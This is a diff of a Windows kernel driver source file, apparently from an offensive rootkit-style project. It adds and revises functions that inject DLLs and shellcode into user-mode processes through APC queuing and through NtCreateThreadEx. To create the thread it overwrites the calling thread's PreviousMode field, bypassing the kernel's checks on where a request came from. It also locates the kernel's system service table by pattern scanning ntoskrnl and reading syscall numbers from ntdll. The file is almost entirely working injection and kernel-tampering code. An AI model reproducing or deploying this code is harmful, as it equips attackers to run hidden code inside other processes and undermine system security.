@@ -7,13 +7,19 @@ PVOID GetFunctionAddress(PVOID moduleBase, CHAR* functionName);
 NTSTATUS KeWriteProcessMemory(PVOID sourceDataAddress, PEPROCESS TargetProcess, PVOID targetAddress, SIZE_T dataSize, MODE mode);
 NTSTATUS KeReadProcessMemory(PEPROCESS Process, PVOID sourceAddress, PVOID targetAddress, SIZE_T dataSize, MODE mode);
 NTSTATUS PatchModule(PatchedModule* ModuleInformation);
-NTSTATUS InjectShellcode(ShellcodeInformation* ShellcodeInformation);
-NTSTATUS InjectDll(DllInformation* DllInfo);
+NTSTATUS InjectShellcodeAPC(ShellcodeInformation* ShellcodeInformation);
+NTSTATUS InjectDllAPC(DllInformation* DllInfo);
 NTSTATUS FindThread(HANDLE pid, PETHREAD* Thread);
+PVOID FindPattern(PCUCHAR pattern, UCHAR wildcard, ULONG_PTR len, const PVOID base, ULONG_PTR size);
+NTSTATUS GetSSDTAddress();
+PVOID GetSSDTFunctionAddress(CHAR* functionName);
 VOID ApcInjectionCallback(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID* NormalContext, PVOID* SystemArgument1, PVOID* SystemArgument2);
 VOID PrepareApcCallback(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID* NormalContext, PVOID* SystemArgument1, PVOID* SystemArgument2);
 
 // Definitions.
+#define THREAD_PREVIOUSMODE_OFFSET 0x232
+#define RETURN_OPCODE 0xC3
+#define MOV_EAX_OPCODE 0xB8
 #define PATH_OFFSET 0x190
 #define DLL_INJ_SHELLCODE_SIZE 704
 #define ALERTABLE_THREAD_FLAG_BIT 0x10
@@ -87,7 +93,7 @@ UCHAR shellcodeTemplate[DLL_INJ_SHELLCODE_SIZE] = {
 
 /*
 * Description:
-* InjectDll is responsible injecting a dll in a certain usermode process.
+* InjectDllAPC is responsible to inject a dll in a certain usermode process with APC.
 *
 * Parameters:
 * @DllInfo [DllInformation*] -- All the information regarding the injected dll.
@@ -95,10 +101,9 @@ UCHAR shellcodeTemplate[DLL_INJ_SHELLCODE_SIZE] = {
 * Returns:
 * @status  [NTSTATUS]		 -- Whether successfuly injected or not.
 */
-NTSTATUS InjectDll(DllInformation* DllInfo) {
-	SIZE_T bytesWritten;
+NTSTATUS InjectDllAPC(DllInformation* DllInfo) {
 	ShellcodeInformation ShellcodeInfo;
-	PVOID shellcode;
+	PVOID shellcode = NULL;
 	SIZE_T shellcodeSize = DLL_INJ_SHELLCODE_SIZE;
 
 	NTSTATUS status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &shellcode, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
@@ -126,7 +131,7 @@ NTSTATUS InjectDll(DllInformation* DllInfo) {
 	ShellcodeInfo.Shellcode = shellcode;
 	ShellcodeInfo.ShellcodeSize = DLL_INJ_SHELLCODE_SIZE;
 
-	status = InjectShellcode(&ShellcodeInfo);
+	status = InjectShellcodeAPC(&ShellcodeInfo);
 
 CleanUp:
 	if (!NT_SUCCESS(status) && shellcode)
@@ -137,7 +142,92 @@ CleanUp:
 
 /*
 * Description:
-* InjectShellcode is responsible injecting a shellcode in a certain usermode process.
+* InjectDllThread is responsible to inject a dll in a certain usermode process with NtCreateThreadEx.
+*
+* Parameters:
+* @DllInfo [DllInformation*] -- All the information regarding the injected dll.
+*
+* Returns:
+* @status  [NTSTATUS]		 -- Whether successfuly injected or not.
+*/
+NTSTATUS InjectDllThread(DllInformation* DllInfo) {
+	OBJECT_ATTRIBUTES objAttr;
+	CLIENT_ID cid;
+	KAPC_STATE state;
+	HANDLE hProcess = NULL;
+	HANDLE hTargetThread = NULL;
+	PEPROCESS TargetProcess = NULL;
+	PVOID remoteAddress = NULL;
+	HANDLE pid = UlongToHandle(DllInfo->Pid);
+	SIZE_T pathLength = strlen(DllInfo->DllPath) + 1;
+	NTSTATUS status = PsLookupProcessByProcessId(pid, &TargetProcess);
+
+	if (!NT_SUCCESS(status))
+		goto CleanUp;
+
+	KeStackAttachProcess(TargetProcess, &state);
+	PVOID kernel32Base = GetModuleBase(TargetProcess, L"C:\\Windows\\System32\\kernel32.dll");
+
+	if (!kernel32Base) {
+		KeUnstackDetachProcess(&state);
+		goto CleanUp;
+	}
+
+	PVOID loadLibraryAddress = GetFunctionAddress(kernel32Base, "LoadLibraryA");
+
+	if (!loadLibraryAddress) {
+		KeUnstackDetachProcess(&state);
+		goto CleanUp;
+	}
+	KeUnstackDetachProcess(&state);
+
+	InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
+	cid.UniqueProcess = pid;
+	cid.UniqueThread = NULL;
+
+	status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &cid);
+
+	if (!NT_SUCCESS(status))
+		goto CleanUp;
+
+	status = ZwAllocateVirtualMemory(hProcess, &remoteAddress, 0, &pathLength, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
+
+	if (!NT_SUCCESS(status))
+		goto CleanUp;
+	pathLength = strlen(DllInfo->DllPath) + 1;
+
+	status = KeWriteProcessMemory(&(DllInfo->DllPath), TargetProcess, remoteAddress, pathLength, KernelMode);
+
+	if (!NT_SUCCESS(status))
+		goto CleanUp;
+	
+	// Making sure that for the creation the thread has access to kernel addresses and restoring the permissions right after.
+	InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
+	PCHAR previousMode = (PCHAR)((PUCHAR)PsGetCurrentThread() + THREAD_PREVIOUSMODE_OFFSET);
+	CHAR tmpPreviousMode = *previousMode;
+	*previousMode = KernelMode;
+	status = NtCreateThreadEx(&hTargetThread, THREAD_ALL_ACCESS, &objAttr, hProcess, (PTHREAD_START_ROUTINE)loadLibraryAddress, remoteAddress, 0, NULL, NULL, NULL, NULL);
+	*previousMode = tmpPreviousMode;
+
+CleanUp:
+	if (hTargetThread)
+		ZwClose(hTargetThread);
+
+	if (!NT_SUCCESS(status) && remoteAddress)
+		ZwFreeVirtualMemory(hProcess, &remoteAddress, &pathLength, MEM_DECOMMIT);
+
+	if (hProcess)
+		ZwClose(hProcess);
+
+	if (TargetProcess)
+		ObDereferenceObject(TargetProcess);
+
+	return status;
+}
+
+/*
+* Description:
+* InjectShellcodeAPC is responsible to inject a shellcode in a certain usermode process.
 *
 * Parameters:
 * @ShellcodeInfo [ShellcodeInformation*] -- All the information regarding the injected shellcode.
@@ -145,7 +235,7 @@ CleanUp:
 * Returns:
 * @status		 [NTSTATUS]				 -- Whether successfuly injected or not.
 */
-NTSTATUS InjectShellcode(ShellcodeInformation* ShellcodeInfo) {
+NTSTATUS InjectShellcodeAPC(ShellcodeInformation* ShellcodeInfo) {
 	OBJECT_ATTRIBUTES objAttr;
 	CLIENT_ID cid;
 	HANDLE hProcess = NULL;
@@ -201,15 +291,15 @@ NTSTATUS InjectShellcode(ShellcodeInformation* ShellcodeInfo) {
 		goto CleanUp;
 	}
 	
-	dimGlobals.KeInitializeApc(PrepareApc, TargetThread, OriginalApcEnvironment, (PKKERNEL_ROUTINE)PrepareApcCallback, NULL, NULL, KernelMode, NULL);
-	dimGlobals.KeInitializeApc(ShellcodeApc, TargetThread, OriginalApcEnvironment, (PKKERNEL_ROUTINE)ApcInjectionCallback, NULL, (PKNORMAL_ROUTINE)shellcodeAddress, UserMode, ShellcodeInfo->Parameter1);
+	KeInitializeApc(PrepareApc, TargetThread, OriginalApcEnvironment, (PKKERNEL_ROUTINE)PrepareApcCallback, NULL, NULL, KernelMode, NULL);
+	KeInitializeApc(ShellcodeApc, TargetThread, OriginalApcEnvironment, (PKKERNEL_ROUTINE)ApcInjectionCallback, NULL, (PKNORMAL_ROUTINE)shellcodeAddress, UserMode, ShellcodeInfo->Parameter1);
 
-	if (!dimGlobals.KeInsertQueueApc(ShellcodeApc, ShellcodeInfo->Parameter2, ShellcodeInfo->Parameter3, FALSE)) {
+	if (!KeInsertQueueApc(ShellcodeApc, ShellcodeInfo->Parameter2, ShellcodeInfo->Parameter3, FALSE)) {
 		status = STATUS_UNSUCCESSFUL;
 		goto CleanUp;
 	}
 
-	if (!dimGlobals.KeInsertQueueApc(PrepareApc, NULL, NULL, FALSE)) {
+	if (!KeInsertQueueApc(PrepareApc, NULL, NULL, FALSE)) {
 		status = STATUS_UNSUCCESSFUL;
 		goto CleanUp;
 	}
@@ -354,7 +444,7 @@ NTSTATUS KeWriteProcessMemory(PVOID sourceDataAddress, PEPROCESS TargetProcess, 
 
 	patchLen = dataSize;
 	PVOID addressToProtect = targetAddress;
-	status = dimGlobals.ZwProtectVirtualMemory(hTargetProcess, &addressToProtect, &patchLen, PAGE_READWRITE, &oldProtection);
+	status = ZwProtectVirtualMemory(hTargetProcess, &addressToProtect, &patchLen, PAGE_READWRITE, &oldProtection);
 
 	if (!NT_SUCCESS(status)) {
 		KdPrint((DRIVER_PREFIX "Failed to change protection, (0x%08X).\n", status));
@@ -364,7 +454,7 @@ NTSTATUS KeWriteProcessMemory(PVOID sourceDataAddress, PEPROCESS TargetProcess, 
 	ZwClose(hTargetProcess);
 
 	// Writing the data.
-	status = dimGlobals.MmCopyVirtualMemory(PsGetCurrentProcess(), sourceDataAddress, TargetProcess, targetAddress, dataSize, KernelMode, &bytesWritten);
+	status = MmCopyVirtualMemory(PsGetCurrentProcess(), sourceDataAddress, TargetProcess, targetAddress, dataSize, KernelMode, &bytesWritten);
 
 	if (!NT_SUCCESS(status))
 		KdPrint((DRIVER_PREFIX "MmCopyVirtualMemory failed status, (0x%08X).\n", status));
@@ -372,7 +462,7 @@ NTSTATUS KeWriteProcessMemory(PVOID sourceDataAddress, PEPROCESS TargetProcess, 
 	// Restoring permissions and cleaning up.
 	if (ObOpenObjectByPointer(TargetProcess, OBJ_KERNEL_HANDLE, NULL, PROCESS_ALL_ACCESS, *PsProcessType, mode, &hTargetProcess) == STATUS_SUCCESS) {
 		patchLen = dataSize;
-		dimGlobals.ZwProtectVirtualMemory(hTargetProcess, &addressToProtect, &patchLen, oldProtection, &oldProtection);
+		ZwProtectVirtualMemory(hTargetProcess, &addressToProtect, &patchLen, oldProtection, &oldProtection);
 		ZwClose(hTargetProcess);
 	}
 
@@ -411,7 +501,7 @@ NTSTATUS KeReadProcessMemory(PEPROCESS Process, PVOID sourceAddress, PVOID targe
 		return STATUS_UNSUCCESSFUL;
 	}
 
-	return dimGlobals.MmCopyVirtualMemory(Process, sourceAddress, PsGetCurrentProcess(), targetAddress, dataSize, KernelMode, &bytesRead);
+	return MmCopyVirtualMemory(Process, sourceAddress, PsGetCurrentProcess(), targetAddress, dataSize, KernelMode, &bytesRead);
 }
 
 /*
@@ -430,16 +520,15 @@ PVOID GetModuleBase(PEPROCESS Process, WCHAR* moduleName) {
 	LARGE_INTEGER time = { 0 };
 	time.QuadPart = -100ll * 10 * 1000;
 
-	PREALPEB targetPeb = (PREALPEB)dimGlobals.PsGetProcessPeb(Process);
+	PREALPEB targetPeb = (PREALPEB)PsGetProcessPeb(Process);
 
 	if (!targetPeb) {
 		KdPrint((DRIVER_PREFIX "Failed to get PEB.\n"));
 		return moduleBase;
 	}
 
-	for (int i = 0; !targetPeb->LoaderData && i < 10; i++)
-	{
-		KeDelayExecutionThread(KernelMode, TRUE, &time);
+	for (int i = 0; !targetPeb->LoaderData && i < 10; i++) {
+		KeDelayExecutionThread(KernelMode, FALSE, &time);
 	}
 
 	if (!targetPeb->LoaderData) {
@@ -453,7 +542,7 @@ PVOID GetModuleBase(PEPROCESS Process, WCHAR* moduleName) {
 		pListEntry = pListEntry->Flink) {
 
 		PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
-
+		
 		if (_wcsnicmp(pEntry->FullDllName.Buffer, moduleName, pEntry->FullDllName.Length / sizeof(wchar_t) - 4) == 0) {
 			moduleBase = pEntry->DllBase;
 			break;
@@ -517,7 +606,228 @@ PVOID GetFunctionAddress(PVOID moduleBase, CHAR* functionName) {
 
 /*
 * Description:
-* GetModuleBase is responsible for finding an alertable thread within a process.
+* GetSSDTFunctionAddress is responsible for getting the SSDT's location.
+*
+* Parameters:
+* There are no parameters.
+*
+* Returns:
+* @status [NTSTATUS] -- STATUS_SUCCESS if found, else error.
+*/
+PVOID GetSSDTFunctionAddress(CHAR* functionName) {
+	KAPC_STATE state;
+	PEPROCESS CsrssProcess = NULL;
+	PVOID functionAddress = NULL;
+	PSYSTEM_PROCESS_INFO originalInfo = NULL;
+	PSYSTEM_PROCESS_INFO info = NULL;
+	ULONG infoSize = 0;
+	ULONG index = 0;
+	UCHAR syscall = 0;
+	HANDLE csrssPid = 0;
+	NTSTATUS status = ZwQuerySystemInformation(SystemProcessInformation, NULL, 0, &infoSize);
+
+	while (status == STATUS_INFO_LENGTH_MISMATCH) {
+		if (originalInfo) {
+			ExFreePoolWithTag(originalInfo, DRIVER_TAG);
+			originalInfo = NULL;
+		}
+
+		originalInfo = (PSYSTEM_PROCESS_INFO)ExAllocatePoolWithTag(PagedPool, infoSize, DRIVER_TAG);
+
+		if (!originalInfo)
+			return functionAddress;
+
+		status = ZwQuerySystemInformation(SystemProcessInformation, originalInfo, infoSize, &infoSize);
+	}
+
+	if (!NT_SUCCESS(status) || !originalInfo)
+		goto CleanUp;
+
+	// Using another info variable to avoid BSOD on freeing.
+	info = originalInfo;
+
+	// Iterating the processes information until our pid is found.
+	while (info->NextEntryOffset) {
+		if (info->ImageName.Buffer && info->ImageName.Length > 0) {
+			if (_wcsicmp(info->ImageName.Buffer, L"csrss.exe") == 0) {
+				csrssPid = info->UniqueProcessId;
+				break;
+			}
+		}
+		info = (PSYSTEM_PROCESS_INFO)((PUCHAR)info + info->NextEntryOffset);
+	}
+
+	if (csrssPid == 0)
+		goto CleanUp;
+	status = PsLookupProcessByProcessId(csrssPid, &CsrssProcess);
+
+	if (!NT_SUCCESS(status))
+		goto CleanUp;
+
+	// Attaching to the process's stack to be able to walk the PEB.
+	KeStackAttachProcess(CsrssProcess, &state);
+	PVOID ntdllBase = GetModuleBase(CsrssProcess, L"C:\\Windows\\System32\\ntdll.dll");
+
+	if (!ntdllBase) {
+		KeUnstackDetachProcess(&state);
+		goto CleanUp;
+	}
+	PVOID ntdllFunctionAddress = GetFunctionAddress(ntdllBase, functionName);
+
+	if (!ntdllFunctionAddress) {
+		KeUnstackDetachProcess(&state);
+		goto CleanUp;
+	}
+	KeUnstackDetachProcess(&state);
+
+	// Searching for the syscall.
+	while (((PUCHAR)ntdllFunctionAddress)[index] != RETURN_OPCODE) {
+		if (((PUCHAR)ntdllFunctionAddress)[index] == MOV_EAX_OPCODE) {
+			syscall = ((PUCHAR)ntdllFunctionAddress)[index + 1];
+		}
+		index++;
+	}
+
+	if (syscall != 0)
+		functionAddress = (PUCHAR)ssdt->ServiceTableBase + (((PLONG)ssdt->ServiceTableBase)[syscall] >> 4);
+
+CleanUp:
+	if (CsrssProcess)
+		ObDereferenceObject(CsrssProcess);
+
+	if (originalInfo) {
+		ExFreePoolWithTag(originalInfo, DRIVER_TAG);
+		originalInfo = NULL;
+	}
+
+	return functionAddress;
+}
+
+
+/*
+* Description:
+* GetSSDTAddress is responsible for getting the SSDT's location.
+*
+* Parameters:
+* There are no parameters.
+*
+* Returns:
+* @status [NTSTATUS] -- STATUS_SUCCESS if found, else error.
+*/
+NTSTATUS GetSSDTAddress() {
+	ULONG infoSize;
+	PVOID ssdtRelativeLocation = NULL;
+	PVOID ntoskrnlBase = NULL;
+	PRTL_PROCESS_MODULES info = NULL;
+	NTSTATUS status = STATUS_SUCCESS;
+	UCHAR pattern[] = "\x4c\x8d\x15\xcc\xcc\xcc\xcc\x4c\x8d\x1d\xcc\xcc\xcc\xcc\xf7";
+
+	// Getting ntoskrnl base first.
+	status = ZwQuerySystemInformation(SystemModuleInformation, NULL, 0, &infoSize);
+
+	while (status == STATUS_INFO_LENGTH_MISMATCH) {
+		if (info) {
+			ExFreePoolWithTag(info, DRIVER_TAG);
+			info = NULL;
+		}
+
+		info = (PRTL_PROCESS_MODULES)ExAllocatePoolWithTag(PagedPool, infoSize, DRIVER_TAG);
+
+		if (!info)
+			return STATUS_INSUFFICIENT_RESOURCES;
+
+		status = ZwQuerySystemInformation(SystemModuleInformation, info, infoSize, &infoSize);
+	}
+
+	if (!NT_SUCCESS(status) || !info)
+		goto CleanUp;
+
+	PRTL_PROCESS_MODULE_INFORMATION modules = info->Modules;
+
+	for (ULONG i = 0; i < info->NumberOfModules; i++) {
+		if (NtCreateFile >= modules[i].ImageBase && NtCreateFile < (PVOID)((PUCHAR)modules[i].ImageBase + modules[i].ImageSize)) {
+			ntoskrnlBase = modules[i].ImageBase;
+			break;
+		}
+	}
+
+	if (!ntoskrnlBase)
+		goto CleanUp;
+	
+	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)ntoskrnlBase;
+
+	// Finding the SSDT address.
+	auto prevIrql = KeGetCurrentIrql();
+	status = STATUS_NOT_FOUND;
+	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
+		goto CleanUp;
+
+	PFULL_IMAGE_NT_HEADERS ntHeaders = (PFULL_IMAGE_NT_HEADERS)((PUCHAR)ntoskrnlBase + dosHeader->e_lfanew);
+
+	if (ntHeaders->Signature != IMAGE_NT_SIGNATURE)
+		goto CleanUp;
+
+	PIMAGE_SECTION_HEADER firstSection = (PIMAGE_SECTION_HEADER)(ntHeaders + 1);
+	
+	for (PIMAGE_SECTION_HEADER section = firstSection; section < firstSection + ntHeaders->FileHeader.NumberOfSections; section++) {
+		if (strcmp((const char*)section->Name, ".text") == 0) {
+			ssdtRelativeLocation = FindPattern(pattern, 0xCC, sizeof(pattern) - 1, (PUCHAR)ntoskrnlBase + section->VirtualAddress, section->Misc.VirtualSize);
+
+			if (ssdtRelativeLocation) {
+				status = STATUS_SUCCESS;
+				ssdt = (PSYSTEM_SERVICE_DESCRIPTOR_TABLE)((PUCHAR)ssdtRelativeLocation + *(PULONG)((PUCHAR)ssdtRelativeLocation + 3) + 7);
+				break;
+			}
+		}
+	}
+
+CleanUp:
+	if (info)
+		ExFreePoolWithTag(info, DRIVER_TAG);
+
+	return status;
+}
+
+/*
+* Description:
+* FindPattern is responsible for finding a pattern in memory range.
+*
+* Parameters:
+* @pattern  [PCUCHAR]	  -- Pattern to search for.
+* @wildcard [UCHAR]		  -- Used wildcard.
+* @len		[ULONG_PTR]	  -- Pattern length.
+* @base		[const PVOID] -- Base address for searching.
+* @size		[ULONG_PTR]	  -- Address range to search in.
+*
+* Returns:
+* @address	 [PVOID]	 -- Pattern's address if found, else 0.
+*/
+PVOID FindPattern(PCUCHAR pattern, UCHAR wildcard, ULONG_PTR len, const PVOID base, ULONG_PTR size) {
+	bool found;
+
+	if (pattern == NULL || base == NULL || len == 0 || size == 0)
+		return NULL;
+
+	for (ULONG_PTR i = 0; i < size - len; i++) {
+		found = true;
+
+		for (ULONG_PTR j = 0; j < len; j++) {
+			if (pattern[j] != wildcard && pattern[j] != ((PCUCHAR)base)[i + j]) {
+				found = false;
+				break;
+			}
+		}
+
+		if (found)
+			return (PUCHAR)base + i;
+	}
+
+	return NULL;
+}
+
+/*
+* Description:
+* FindThread is responsible for finding an alertable thread within a process.
 *
 * Parameters:
 * @Process    [PEPROCESS] -- The process to search on.
@@ -531,7 +841,7 @@ NTSTATUS FindThread(HANDLE pid, PETHREAD* Thread) {
 	PSYSTEM_PROCESS_INFO originalInfo = NULL;
 	PSYSTEM_PROCESS_INFO info = NULL;
 	ULONG infoSize = 0;
-	NTSTATUS status = dimGlobals.ZwQuerySystemInformation(SystemProcessInformation, NULL, 0, &infoSize);
+	NTSTATUS status = ZwQuerySystemInformation(SystemProcessInformation, NULL, 0, &infoSize);
 
 	while (status == STATUS_INFO_LENGTH_MISMATCH) {
 		if (originalInfo) {
@@ -544,7 +854,7 @@ NTSTATUS FindThread(HANDLE pid, PETHREAD* Thread) {
 		if (!originalInfo)
 			return STATUS_INSUFFICIENT_RESOURCES;
 
-		status = dimGlobals.ZwQuerySystemInformation(SystemProcessInformation, originalInfo, infoSize, &infoSize);
+		status = ZwQuerySystemInformation(SystemProcessInformation, originalInfo, infoSize, &infoSize);
 	}
 
 	if (!NT_SUCCESS(status) || !originalInfo)
@@ -648,6 +958,6 @@ VOID PrepareApcCallback(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID* Norma
 	UNREFERENCED_PARAMETER(SystemArgument1);
 	UNREFERENCED_PARAMETER(SystemArgument2);
 
-	dimGlobals.KeTestAlertThread(UserMode);
+	KeTestAlertThread(UserMode);
 	ExFreePoolWithTag(Apc, DRIVER_TAG);
 }
